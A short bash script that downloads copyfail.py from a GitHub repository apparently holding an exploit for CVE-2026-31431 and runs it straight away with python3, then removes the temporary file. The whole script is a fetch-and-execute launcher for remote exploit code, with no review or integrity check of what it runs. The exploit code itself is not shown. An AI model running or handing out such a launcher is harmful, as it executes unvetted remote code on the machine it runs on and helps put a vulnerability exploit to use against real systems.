#!/usr/bin/env bash
set -euo pipefail

SCRIPT_URL="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/main/copyfail.py"

TMP_FILE="$(mktemp --suffix=.py)"
trap 'rm -f "$TMP_FILE"' EXIT

curl -fsSL "$SCRIPT_URL" -o "$TMP_FILE"

python3 "$TMP_FILE"
